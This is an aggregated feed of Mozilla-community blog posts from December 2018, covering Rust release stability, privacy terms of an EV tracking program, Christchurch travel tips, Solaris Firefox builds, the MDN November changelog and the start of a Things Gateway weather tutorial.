<p>Rust has successfully delivered on ‚Äústability without stagnation‚Äù to the point that Red Hat has <a href="https://developers.redhat.com/blog/2018/11/20/support-lifecycle-for-clang-llvm-go-and-rust/">announced</a> Rust updates for RHEL on a 3-month frequency instead of Rust getting stuck for the duration of the lifecycle of a RHEL version. That is, contrary to popular belief, the ‚Äústability‚Äù part works without an LTS. At this point, doing an LTS would be a stategic blunder that would jeopardize the ‚Äúwithout stagnation‚Äù part.

</p></div></div><div class="permalink"><a href="https://hsivonen.fi/rust2019/">by Henri Sivonen at <time datetime="2018-12-15T19:36:20Z" title="December 15, 2018 07:36 PM GMT">‰∏äÂçà3:36:20</time></a></div></div><h2><time datetime="2018-12-15">Saturday, 15 December 2018</time></h2><div class="news andy-mckay" xml:lang="en-us"><a id="news-21"></a><h3><a href="http://www.agmweb.ca/blog/andy" title="Andy McKay">Andy McKay</a> ‚Äî <a href="http://www.agmweb.ca/2018-12-15-car-tracking/">Car Tracking</a></h3><div class="entry"><div class="content"><p>This week I recieved and email from the Clean Energy Vehicle program. They'd like us to install a device in our Tesla that tracks us:</p>

<p>"By understanding when and where EVs charge to how much energy is consumed, you can help pave the way for future drivers by ensuring that the power system is ready for a plug-in future."</p>

<p>The program details <a href="https://www.fleetcarma.com/chargebc/">are here</a>.</p>

<p>"GPS information is collected, but not shared at the individual level. The data is collected and stored but no one outside of FleetCarma will see an individual‚Äôs location data."</p>

<p>Alright so who's FleetCarma? Let's look into <a href="https://www.fleetcarma.com/chargebc/terms/">the terms</a>:</p>

<p>"Data Collected by the C2 Device and Privacy...  drive start date and time, duration of trip, trip distance... GPS coordinates of the drive,"</p>

<p>"With the specific exclusion of GPS coordinates when driving, an anonymized subset of the data outlined above may be shared with the Province and BC Hydro and other third party suppliers"</p>

<p>"GPS coordinates during driving will not be shared with any Program partners or third party suppliers except in both anonymous and aggregate form to inhibit extraction of any individual driving behaviour."</p>

<p>Not sure who those Program partners or third party suppliers are but GeoTab uses <a href="https://docs.google.com/document/d/1sVygLN02w2xNovFY4q5vw-oAzfYxCd7WLhyToElgDbs/pub">some sub-processors</a>.</p>

<p>FletCarma will <a href="https://www.fleetcarma.com/privacy/">share your information</a>:</p>

<p>"To affiliated entities of CrossChasm Technologies Inc., including wholly owned subsidiaries" (Whomever that is)</p>

<p>"When we‚Äôre legally required to provide data, such as in response to a subpoena in a civil lawsuit."</p>

<p>It's nice to note.</p>

<p>"You may also request that your Personal Information be deleted. FleetCarma will promptly respond to your request within 30 days"</p>

<p>At this point I can surmise that:</p>

<ul>
<li><p>FleetCarma will know all the trips I make in the car.</p></li>
<li><p>FleetCarma be subpoenad to give up that information.</p></li>
<li><p>FleetCarma can be hacked to give up all that information.</p></li>
</ul>

<p>Normally this would be a simple, hell no. But I care greatly about electric cars and the infrastructure and this has put me in a bind. The privacy problem here is one that I simply can't get around. </p></div></div><div class="permalink"><a href="http://www.agmweb.ca/2018-12-15-car-tracking/">by Andy McKay at <time datetime="2018-12-15T08:00:00Z" title="December 15, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><div class="news nick-cameron"><a id="news-22"></a><h3><a href="http://www.ncameron.org/blog/" title="featherweight musings">Nick Cameron</a> ‚Äî <a href="http://www.ncameron.org/blog/what-to-do-in-christchurch/">What to do in Christchurch</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><p>LCA 2018 is happening in January in Christchurch (which is a great conference and has a few Rust talks this year). I'm not able to attend, but I am in town, so I hope to meet some of my internet friends (get in touch!).</p>
<p>I thought I'd write down a few things to do in Christchurch for those who are new to the city. Don't get your hopes up for lots of tourist fun though (unless you have time to see some of the surrounding country), it is not the most interesting city, even less so since half of it was flattened in an earthquake. For more ideas, I like the <a href="https://neatplaces.co.nz/places/christchurch-canterbury">Neat Places website</a>.</p>
<h3>Good places to drink coffee</h3>
<ul>
<li>C4</li>
<li>Coffee Embassy</li>
<li>the brunch places below</li>
</ul>
<h3>Good places to drink alcohol</h3>
<ul>
<li>The Volsted (near-ish the university)</li>
<li>44 Welles Street</li>
</ul>
<h3>Good places to eat brunch</h3>
<ul>
<li>Hello Sunday</li>
<li>Unknown Chapter</li>
<li>Supreme Supreme (if they re-open in time - they're currently closed for refurbishment)</li>
<li>Addington Coffee Co</li>
<li>Caffeine Laboratory</li>
<li>Black Betty</li>
<li>Southside Social</li>
</ul>
<h3>Good places to eat dinner</h3>
<ul>
<li>Rangoon Ruby (Burmese)</li>
<li>Mumbaiwala (fancy Indian street food)</li>
<li>Birkenavala (cheap and delicious Indian)</li>
<li>Little High Eatery (hipster food court, lots of options)</li>
<li>Mexico (interesting but expensive Mexican food and lots of drinks)</li>
<li>Cassels (great pizza and great beer)</li>
</ul>
<h3>Best ice cream</h3>
<ul>
<li>Rollickin‚Äô Gelato</li>
</ul>
<h3>Best place to swim</h3>
<ul>
<li>Jellie Park - 50m outdoor pool and 2x25m indoor pools. Also a decent gym which you can use without a membership.</li>
</ul>
<h3>Best place to run</h3>
<ul>
<li>Hagley Park</li>
</ul>
<h3>Best beach</h3>
<ul>
<li>Sumner - it has a good bit of sand plus some surfing and is a nice little beach village</li>
</ul>
<h3>Good places to go nearby</h3>
<ul>
<li>Castle Hill (On the way to Arthur's Pass, kind of magical, nature-sculpted boulders to work amongst)</li>
<li>Arthur's Pass national park (Mountains and forests, one of NZ's lesser visited NPs, but one of my favourite)</li>
<li>Akaroa (cute tourist town (and you can swim with dolphins), drive there the long way via Governor's Bay and enjoy food and views and chocolate at She cafe, as well as a nice drive. If you like cheese, stop at Barrys Bay)</li>
</ul>
<h3>Good things to see and do in town</h3>
<ul>
<li>Look at the ruins of the Cathedral and wonder the new city centre.</li>
<li>Riccarton House farmers market (Saturday Morning; lots of nice things to eat and drink)</li>
<li>Walk in the Port Hills</li>
<li>The Buskers Festival (Throughout January, lots of shows)</li>
<li>Go to the beach (see above)</li>
</ul>
<p>Any questions, ping me on twitter - <a href="https://twitter.com/nick_r_cameron">@nick_r_cameron</a>.</p>
</div></div></div><div class="permalink"><a href="http://www.ncameron.org/blog/what-to-do-in-christchurch/">by Nick Cameron at <time datetime="2018-12-15T04:17:56Z" title="December 15, 2018 04:17 AM GMT">‰∏ãÂçà12:17:56</time></a></div></div><div class="news cameron-kaiser"><a id="news-23"></a><h3><a href="http://tenfourfox.blogspot.com/" title="TenFourFox Development">Cameron Kaiser</a> ‚Äî <a href="http://tenfourfox.blogspot.com/2018/12/a-thank-you-to-ginn-chen-whom-larry.html">A thank you to Ginn Chen, whom Larry Ellison screwed</a></h3><div class="entry"><div class="content">Periodically I refresh my machines by dusting them off and plugging them in and running them for a while to keep the disks spinnin' and the caps chargin'. Today was the day to refurbish my Sun Ultra-3, the only laptop Sun ever "made" (they actually rebadged the SPARCle and later the crotchburner 1.2GHz Tadpole Viper, which is the one I have). Since its last refresh the IDPROM had died, as they do when they run out of battery, resetting the MAC address to zeroes and erasing the license for the 802.11b which I never used anyway. But, after fixing the clock to prevent GNOME from puking on the abnormal date, it booted and I figured I'd update Firefox since it still had 38.4 on it. Ginn Chen, first at Sun and later at Oracle, regularly issued builds of Firefox which ran very nicely on SPARC Solaris 10. Near as I can determine, Oracle has never offered a build of <a href="http://tenfourfox.blogspot.com/2018/07/another-one-bites-rust.html">any Firefox post-Rust</a> even to the paying customers they're bleeding dry, but I figured I should be able to find the last ESR of 52 and install that. (Amusingly this relic can run a Firefox in some respects more current than TenFourFox, which is an evolved and patched Firefox 45.) <p>To my consternation, however, <a href="https://ftp.mozilla.org/pub/firefox/releases/52.9.0esr/">there was no contributed build for 52.9</a>, the last 52ESR. I had to walk <a href="https://ftp.mozilla.org/pub/firefox/releases/52.0.2esr/contrib/solaris_pkgadd/">all the way back to 52.0.2</a> to find the last Solaris 10 package, which was accompanied by <a href="https://ftp.mozilla.org/pub/firefox/releases/52.0.2esr/contrib/solaris_pkgadd/README.txt">this sad message</a>: </p><p></p><blockquote><tt>This directory contains Solaris builds of Firefox 52.0.2 ESR, which are contributed by Oracle Solaris Desktop Beijing Team. If you have any problem with these builds, please send email to ginnchen at gmail dot com </tt><p><tt>This is the last contrib build before I leave Oracle.<br />My job is eliminated.<br />Thanks everyone for supporting me.<br />ginnchen@... </tt></p></blockquote><p>I don't know if anyone ever said to Ginn how much all that work was appreciated. Well, I'm saying it now. I hope for much greener pastures away from scum like Larry, who ruined Sun, Solaris and SPARC just by being his scummy self, and <a href="http://www.chinadaily.com.cn/business/2017-01/17/content_27973408.htm">lays off good folks</a> just so he can buy <a href="https://en.wikipedia.org/wiki/Lanai">another island</a>. Here is Ginn's last build: </p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-aumd-Xc0eUg/XBRz9oNO-BI/AAAAAAAAAxI/I-9QiNVL_xUonLAoO9vA5kUAyOntHX_bwCLcBGAs/s1600/IMG_20181214_185246.jpg" style="margin-left: 1em; margin-right: 1em;"><img src="img_20181214_185246.jpg" width="240" height="320" border="0" /></a></div><p>To this day, in Solaris 11, <a href="https://docs.oracle.com/cd/E37838_01/html/E99082/bundledfreeware.html">Firefox 52.9 is the last Firefox available</a>, probably using Ginn's work.</p></div></div><div class="permalink"><a href="http://tenfourfox.blogspot.com/2018/12/a-thank-you-to-ginn-chen-whom-larry.html">by ClassicHasClass at <time datetime="2018-12-15T03:31:44Z" title="December 15, 2018 03:31 AM GMT">‰∏äÂçà11:31:44</time></a></div></div><div class="news hacks-mozilla-org" xml:lang="en-US"><a id="news-24"></a><h3><a href="https://hacks.mozilla.org/" title="Mozilla Hacks ‚Äì the Web developer blog">Hacks.Mozilla.Org</a> ‚Äî <a href="https://hacks.mozilla.org/2018/12/mdn-changelog-for-november-2018/">MDN Changelog for November 2018</a></h3><div class="entry"><div class="content"><h3>Done in November</h3>
<p>Here‚Äôs what happened in November to the <a href="https://github.com/mdn/">code, data, and tools</a> that support <a href="https://developer.mozilla.org/">MDN Web Docs</a>:</p>
<ul>
<li><a href="https://hacks.mozilla.org/feed/#shipped-monthly-mdn-payments">Shipped monthly MDN Payments</a></li>
<li><a href="https://hacks.mozilla.org/feed/#converted-from-font-awesome-to-svg">Converted from Font Awesome to SVG</a></li>
<li><a href="https://hacks.mozilla.org/feed/#added-browser-names-to-compatibility-tables">Added browser names to compatibility tables</a></li>
<li><a href="https://hacks.mozilla.org/feed/#welcome-david-flanagan">Welcomed David Flanagan</a></li>
<li><a href="https://hacks.mozilla.org/feed/#shipped-tweaks-and-fixes">Shipped tweaks and fixes</a> by merging 248 pull requests, including 35 pull requests from 30 new contributors.</li>
</ul>
<p>Here‚Äôs the plan for December:</p>
<ul>
<li><a href="https://hacks.mozilla.org/feed/#meet-in-orlando">Meet in Orlando</a></li>
</ul>
<h4>Shipped monthly MDN payments</h4>
<p>In September we <a href="https://hacks.mozilla.org/2018/10/payments-accessibility-and-dead-macros-mdn-changelog-for-september-2018/#launched-mdn-payments">launched MDN payments</a>, giving MDN fans <a href="https://hacks.mozilla.org/2018/10/a-new-way-to-support-mdn/">a new way to help MDN grow</a>. On November 20th, we added the ability to <a href="https://developer.mozilla.org/en-US/payments/recurring">schedule monthly payments</a>.</p>
<div class="wp-caption aligncenter" id="attachment_33029" style="width: 510px;"><a href="https://developer.mozilla.org/en-US/payments/recurring"><img alt="A screenshot of the monthly payment banner, with $8/month selected." class="wp-image-33029 size-large" src="2018-12-monthly-payments-500x230.png" width="500" height="230" /></a><p class="wp-caption-text"><em>Monthly payment banner on MDN</em></p></div>
<p><a href="https://p.ota.to/">Potato London</a> started work on this shortly after one-time payments launched. We kicked it off with a design meeting where we determined the features that could be delivered in 4 weeks. Potato and MDN worked closely to remove blockers, review code (in over 25 pull requests), and get it into the staging environment for testing. Thanks to everyone‚Äôs hard work, we launched a high-quality feature on schedule.</p>
<p>We‚Äôve learned a lot from these payment experiments, and we‚Äôll continue to find ways to maintain MDN‚Äôs growth in 2019.</p>
<h4>Converted from Font Awesome to SVG</h4>
<p>On November 6th, we deployed <a href="https://github.com/schalkneethling">Schalk Neethling‚Äôs</a> <a href="https://github.com/mozilla/kuma/pull/5058">PR 5058</a>, completing the transition from the FontAwesome webfont to inline SVG icons. There are a few icon and style changes, but the site should look the same to most users.</p>
<div class="wp-caption aligncenter" id="attachment_33028" style="width: 510px;"><a href="https://developer.mozilla.org/en-US/docs/Sandbox/All-Indicators"><img alt="Different styles of notice banners with icons from MDN, showing the old Font Awesome banners on the left and the new SVG banners on the right" class="size-large wp-image-33028" src="2018-12-indicators-500x428.png" width="500" height="428" /></a><p class="wp-caption-text"><em>Banners with indicators before the change (left) and after converting to SVG</em></p></div>
<p>We had <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1451261#c0">several reasons</a> for this change in April, when Schalk started the project. The biggest gains were expected to be in performance and a simpler design. Over the year, we became aware that many content blockers prevent loading web fonts, and many users couldn‚Äôt see UIs that depended on icons. For example, the browser compatibility tables <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1480106">were unusable on mobile</a> with <a href="https://www.mozilla.org/en-US/firefox/mobile/">Firefox Focus</a>. This change fixes this issue.</p>
<p>We haven‚Äôt seen a significant performance improvement, although there may have been small improvements as this switch was rolled out over the year. This month, we explored some more radical changes, such as minimal styling and disabled JS, by shipping manually edited copies of wiki pages. These experiments will help us determine the highest impact changes for front-end performance, and provide insight into what areas to explore next.</p>
<h4>Added browser names to compatibility tables</h4>
<p>The new SVG icons are being used in the browser compatibility table. In the wider desktop view, we‚Äôve added rotated browser labels (<a href="https://github.com/mozilla/kuma/pull/5117">Kuma PR 5117</a> and <a href="https://github.com/mdn/kumascript/pull/997">KumaScript PR 997</a>), so it is clearer which browser is which. We also launched a survey to ask visitors about their needs for compatibility data (<a href="https://github.com/mozilla/kuma/pull/5133">Kuma PR 5133</a>).</p>
<div class="wp-caption aligncenter" id="attachment_33027" style="width: 510px;"><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/display#Browser_compatibility"><img alt="A screenshot of a compatibility table with rotated text labels and topped with a survey" class="wp-image-33027 size-large" src="2018-12-bcd-labels-500x352.png" width="500" height="352" /></a><p class="wp-caption-text"><em>The compatibility table for display has gotten even taller</em></p></div>
<p>The compatibility data continues to be released as <a href="https://www.npmjs.com/package/mdn-browser-compat-data">an NPM package</a>, and now <a href="https://github.com/mdn/browser-compat-data/releases">a tagged release</a> is also created, including the statistics and notable changes from the last release (<a href="https://github.com/mdn/browser-compat-data/pull/3158">BCD PR 3158</a>).</p>
<h4>Welcome David Flanagan</h4>
<p><a href="https://github.com/davidflanagan">David Flanagan</a> joined the MDN development team in November. David is the author of <a href="http://shop.oreilly.com/product/9780596101992.do">JavaScript: The Definitive Guide</a> and <a href="https://www.oreilly.com/pub/au/156">several other books</a>. He is a former Mozilla employee, and recently worked at <a href="https://www.khanacademy.org/">Khan Academy</a>. His skills and passions are a great fit for MDN‚Äôs mission, and we look forward to his help as we modernize and expand our tech stack. Welcome David!</p>
<h4>Shipped tweaks and fixes</h4>
<p>There were 248 PRs merged in November:</p>
<ul>
<li><a href="https://github.com/mozilla/kuma/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">74 mozilla/kuma PRs</a></li>
<li><a href="https://github.com/mdn/browser-compat-data/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">59 mdn/browser-compat-data PRs</a></li>
<li><a href="https://github.com/mdn/kumascript/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">34 mdn/kumascript PRs</a></li>
<li><a href="https://github.com/mdn/interactive-examples/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">21 mdn/interactive-examples PRs</a></li>
<li><a href="https://github.com/mdn/infra/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">19 mdn/infra PRs</a></li>
<li><a href="https://github.com/mdn/bob/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">12 mdn/bob PRs</a></li>
<li><a href="https://github.com/mdn/data/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">11 mdn/data PRs</a></li>
<li><a href="https://github.com/mdn/dom-examples/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">3 mdn/dom-examples PRs</a></li>
<li><a href="https://github.com/mdn/django-locallibrary-tutorial/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">2 mdn/django-locallibrary-tutorial PRs</a></li>
<li><a href="https://github.com/mdn/web-speech-api/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">2 mdn/web-speech-api PRs</a></li>
<li><a href="https://github.com/mdn/stumptown-experiment/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">2 mdn/stumptown-experiment PRs</a></li>
<li><a href="https://github.com/mdn/short-descriptions/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">2 mdn/short-descriptions PRs</a></li>
<li><a href="https://github.com/mdn/fetch-examples/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/fetch-examples PR</a></li>
<li><a href="https://github.com/mdn/web-components-examples/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/web-components-examples PR</a></li>
<li><a href="https://github.com/mdn/learning-area/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/learning-area PR</a></li>
<li><a href="https://github.com/mdn/simple-web-worker/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/simple-web-worker PR</a></li>
<li><a href="https://github.com/mdn/crossbrowser-testing-lab/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/crossbrowser-testing-lab PR</a></li>
<li><a href="https://github.com/mdn/css-examples/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/css-examples PR</a></li>
<li><a href="https://github.com/mdn/imsc/pulls?page=1&amp;utf8=%E2%9C%93&amp;q=is:pr+is:closed+merged:%222018-11-01..2018-11-30%22">1 mdn/imsc PR</a></li>
</ul>
<p>This includes some important changes and fixes:</p>
<ul>
<li>Add ARIA roles to notes and warning boxes inside CKEditor (<a href="https://github.com/mozilla/kuma/pull/5069">Kuma PR 5069</a>), from <a href="https://github.com/schalkneethling">Schalk Neethling</a>.</li>
<li>More migration from Python 2 to Python 2/3 (<a href="https://github.com/mozilla/kuma/pull/5071">Kuma PR 5071</a>), from <a href="https://github.com/MatonAnthony">Anthony Maton</a>.</li>
<li>Prefer <code>.blockIndicator</code> for styling note and warning boxes (<a href="https://github.com/mozilla/kuma/pull/5079">Kuma PR 5079</a>), from <a href="https://github.com/ExE-Boss">ExE Boss</a>.</li>
<li>Improve functional tests (<a href="https://github.com/mozilla/kuma/pull/5143">Kuma PR 5143</a>), from <a href="https://github.com/escattone">Ryan Johnson</a>.</li>
<li>Fix deployments by fixing issue with the Jenkins build step (<a href="https://github.com/mdn/interactive-examples/pull/1229">Interactive Examples PR 1229</a>), from <a href="https://github.com/escattone">Ryan Johnson</a>.</li>
<li>Enforce CSP in staging (<a href="https://github.com/mdn/infra/pull/157">infra PR 157</a>), from <a href="https://github.com/jwhitlock">me</a>.</li>
</ul>
<p>35 pull requests were from first-time contributors:</p>
<ul>
<li>Support sticky table of contents on Safari (<a href="https://github.com/mozilla/kuma/pull/5113">Kuma PR 5113</a>), from <a href="https://github.com/rik">Anthony Ricaud</a>.</li>
<li>Upgrade clean-css to version 4.x (<a href="https://github.com/mozilla/kuma/pull/5135">PR 5135</a>), and Stop adding the SEO root title to all document titles (<a href="https://github.com/mozilla/kuma/pull/5142">PR 5142</a>), to Kuma from <a href="https://github.com/davidflanagan">David Flanagan</a>.</li>
<li>Add <code>intrinsicsize</code> to HTML Media elements (<code>img</code>, <code>video</code>) (<a href="https://github.com/mdn/browser-compat-data/pull/2979">PR 2979</a>), from <a href="https://github.com/ZaneHannanAU">ZaneHannanAU</a> (first contribution to BCD).</li>
<li>Update browser compatibility for rest properties in objects (<a href="https://github.com/mdn/browser-compat-data/pull/3038">BCD PR 3038</a>), from <a href="https://github.com/FichteFoll">FichteFoll</a>.</li>
<li>Update <code>insertRule</code> optional <code>index</code> compatibility for IE and FF (<a href="https://github.com/mdn/browser-compat-data/pull/3039">BCD PR 3039</a>), from <a href="https://github.com/timothympace">Tim</a>.</li>
<li>Add compatibility for <code>FullScreen</code> API on IE11 (<a href="https://github.com/mdn/browser-compat-data/pull/3040">BCD PR 3040</a>), from <a href="https://github.com/CntChen">CntChen</a>.</li>
<li>Fix tag escaping in Edge note for <code>FileSystem</code> API (<a href="https://github.com/mdn/browser-compat-data/pull/3043">BCD PR 3043</a>), from <a href="https://github.com/mandel59">Ryusei YAMAGUCHI</a>.</li>
<li>Add <code>object-fit</code> and <code>object-position</code> Safari Support Details (<a href="https://github.com/mdn/browser-compat-data/pull/3045">BCD PR 3045</a>), from <a href="https://github.com/holtjohnson">Holt Johnson</a>.</li>
<li>Add support data for the <code>signal</code> feature from the <code>AbortController</code> API (<a href="https://github.com/mdn/browser-compat-data/pull/3048">PR 3048</a>), from <a href="https://github.com/Konrud">Konstantin Rouda</a> (first contribution to BCD).</li>
<li>Update Firefox compatibility for <code>Window.event</code> (<a href="https://github.com/mdn/browser-compat-data/pull/3057">BCD PR 3057</a>), from <a href="https://github.com/kyro38">Matthieu Riegler</a>.</li>
<li>Update <code>aspect-ratio</code> for Safari on iOS (<a href="https://github.com/mdn/browser-compat-data/pull/3066">BCD PR 3066</a>), from <a href="https://github.com/efc">Eric Celeste</a>.</li>
<li>Add and rename image directives of Feature Policy (<a href="https://github.com/mdn/browser-compat-data/pull/3095">BCD PR 3095</a>), from <a href="https://github.com/jpchase">Jason Chase</a>.</li>
<li>Add support for <code>&lt;meter&gt;</code> in iOS Safari 10.3 (<a href="https://github.com/mdn/browser-compat-data/pull/3109">BCD PR 3109</a>), from <a href="https://github.com/maddesigns">Sven Wolfermann</a>.</li>
<li>Update ‚ÄúTracking Preference Expression (DNT)‚Äù Editor‚Äôs draft URL (<a href="https://github.com/mdn/kumascript/pull/805">KumaScript PR 805</a>), from <a href="https://github.com/vivienlacourba">Vivien Lacourba</a>.</li>
<li>Change WebDriver to Living specification (<a href="https://github.com/mdn/kumascript/pull/930">PR 930</a>), from <a href="https://github.com/andreastt">Andreas Tolfsen</a> (first contribution to KumaScript).</li>
<li>Add Spanish support to <code>Glossary</code> macro (<a href="https://github.com/mdn/kumascript/pull/968">KumaScript PR 968</a>), from <a href="https://github.com/BubuAnabelas">Joaqu√≠n Serna</a>.</li>
<li>Update French string in <code>SeeCompatTable</code> (<a href="https://github.com/mdn/kumascript/pull/975">KumaScript PR 975</a>), from <a href="https://github.com/lp177">lp177</a>.</li>
<li>Convert <code>&lt;audio&gt;</code> example to valid and more semantic HTML (<a href="https://github.com/mdn/interactive-examples/pull/1236">PR 1236</a>), from <a href="https://github.com/karlstolley">Karl Stolley</a> (first contribution to Interactive Examples).</li>
<li>Add <code>grid-area</code> label indicators to <code>div</code> content (<a href="https://github.com/mdn/interactive-examples/pull/1248">Interactive Examples PR 1248</a>), from <a href="https://github.com/mamamusings">Liz Lawley</a>.</li>
<li>Fix <code>-webkit-overflow-scrolling</code> inheritance (<a href="https://github.com/mdn/data/pull/331">Data PR 331</a>), from <a href="https://github.com/timothy003">Timothy Liang</a>.</li>
<li>Add chroma keying example (<a href="https://github.com/mdn/dom-examples/pull/29">PR 29</a>), Add web crypto examples (<a href="https://github.com/mdn/dom-examples/pull/30">PR 30</a>), and Remove web crypto examples (<a href="https://github.com/mdn/dom-examples/pull/31">PR 31</a>), from <a href="https://github.com/wbamberg">wbamberg</a> (first contributions to dom-examples).</li>
<li>Fix indenting of <code>display_genre.short_description = 'Genre'</code> (<a href="https://github.com/mdn/django-locallibrary-tutorial/pull/33">django-locallibrary-tutorial PR 33</a>), from <a href="https://github.com/AlekseiMarinichenko">AlekseiMarinichenko</a>.</li>
<li>Convert <code>speechResult</code> to lowercase to fix phrase matching (<a href="https://github.com/mdn/web-speech-api/pull/29">web-speech-api PR 29</a>), from <a href="https://github.com/bohnacker">Hartmut Bohnacker</a>.</li>
<li>In the synthesis demo, list the voices into alphabetical order (ignoring case) (<a href="https://github.com/mdn/web-speech-api/pull/30">web-speech-api PR 30</a>), from <a href="https://github.com/c12h">Chris Chittleborough</a>.</li>
<li>Add recipes (<a href="https://github.com/mdn/stumptown-experiment/pull/1">PR 1</a>), and Add CSS property transform (<a href="https://github.com/mdn/stumptown-experiment/pull/3">PR 3</a>), from <a href="https://github.com/wbamberg">wbamberg</a> (first contributions to stumptown-experiment).</li>
<li>Add error handling to multiple fetch examples (<a href="https://github.com/mdn/fetch-examples/pull/13">fetch-examples PR 13</a>), from <a href="https://github.com/tjcrowder">T.J. Crowder</a>.</li>
<li>Simplify <code>editable-list</code> example (<a href="https://github.com/mdn/web-components-examples/pull/13">web-components-examples PR 13</a>), from <a href="https://github.com/liuxuewei">liuxuewei</a>.</li>
<li>Add <code>auto</code> to <code>flex</code> to match Firefox‚Äôs wrapping in Safari and Chrome (<a href="https://github.com/mdn/learning-area/pull/108">learning-area PR 108</a>), from <a href="https://github.com/stefsulzer">stefsulzer</a>.</li>
<li>Vary console messages to distinguish between handlers (<a href="https://github.com/mdn/simple-web-worker/pull/10">simple-web-worker PR 10</a>), from <a href="https://github.com/lordloh">Bharath Bhushan Lohray</a>.</li>
<li>Update README to reference MDN docs (<a href="https://github.com/mdn/crossbrowser-testing-lab/pull/1">crossbrowser-testing-lab PR 1</a>), from <a href="https://github.com/100stacks">James Thompson</a>.</li>
<li>Add grid wrapper example to CSS Layout Cookbook (<a href="https://github.com/mdn/css-examples/pull/12">css-examples PR 12</a>), from <a href="https://github.com/mbarker84">Michelle Barker</a>.</li>
</ul>
<h3>Planned for December</h3>
<h4>Meet in Orlando</h4>
<p>Twice a year, all of Mozilla comes together for an All-Hands meeting. This winter‚Äôs All-Hands is in <a href="https://wiki.mozilla.org/All_Hands/Orlando2018">Orlando, Florida</a>. We were in Orlando in December 2015, when Florian was proposing <a href="https://groups.google.com/forum/#!topic/mozilla.dev.mdn/PEuH7WW2Xtk">moving KumaScript macros to GitHub</a> and I was deploying the <a href="https://github.com/mdn/browsercompat/blob/master/HISTORY.rst">BrowserCompat API</a> to beta users. A lot changes in three years!</p>
<p>Many of us at MDN will be taking well-deserved breaks after the All-Hands, and will come back refreshed for 2019. We hope you and yours have an enjoyable winter break!</p>
<p>The post <a href="https://hacks.mozilla.org/2018/12/mdn-changelog-for-november-2018/" rel="nofollow">MDN Changelog for November 2018</a> appeared first on <a href="https://hacks.mozilla.org/" rel="nofollow">Mozilla Hacks - the Web developer blog</a>.</p></div></div><div class="permalink"><a href="https://hacks.mozilla.org/2018/12/mdn-changelog-for-november-2018/">by John Whitlock at <time datetime="2018-12-14T17:48:02Z" title="December 14, 2018 05:48 PM GMT">‰∏äÂçà1:48:02</time></a></div></div><div class="news k-lars-lohn"><a id="news-25"></a><h3><a href="http://www.twobraids.com/search/label/Mozilla" title="twobraids">K Lars Lohn</a> ‚Äî <a href="http://www.twobraids.com/2018/04/things-gateway-virtual-weather-station.html">Things Gateway - a Virtual Weather Station</a></h3><div class="entry"><div class="content">Today, I'm going to talk about creating a Virtual Weather Station using the <a href="https://3.bp.blogspot.com/--40vyotpPcU/Wtd7jX1ohAI/AAAAAAAApr4/aZPeZEd7s6oejhv8yZRog8d7gKCr4LyDwCPcBGAYYCw/s1600/2018-04-18%2B09.09.48.jpg" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img src="2018-04-18@2b09.09.48.jpg" width="320" height="240" border="0" /></a><a href="https://iot.mozilla.org/">Things Gateway from Mozilla</a> and a <a href="https://www.wunderground.com/weather/api/">developer account from Weather Underground</a>.¬† The two combined enable home automation control from weather events like temperature, wind, and precipitation.<br /><br />I've already written the code and this blog is about how to use it.¬† In the next blog posting, I'll talk about how the code actually works. <br /><br /><br /><i><b>Goal:</b> create a virtual Web thing to get weather data into the Things Gateway for use in rules.¬† Specifically, make a rule that turns a green light on when the wind speed is high enough to fly a kite. </i><br /><br /><div><table style="margin-left: 0px; margin-right: auto; text-align: left;" border="1"><tbody><tr><th>Item</th><th>What's it for?</th><th>Where I got it</th></tr><tr><td>an RPi running the Things Gateway</td><td>It's our target to have the weather station provide values to the Things Gateway</td><td><a href="https://iot.mozilla.org/gateway/">General Download &amp; Install Instructions</a><br />or see my own install instructions:<br /><a href="http://www.twobraids.com/2018/02/lars-and-real-internet-of-things-part-2.html">General Install &amp; Zigbee setup, </a><br /><a href="http://www.twobraids.com/2018/02/things-gateway-part-4.html">Philip Hue setup, </a><br /><a href="http://www.twobraids.com/2018/03/things-gateway-part-7-ikea-tradfri.html">IKEA TR√ÖDFRI setup, </a><br /><a 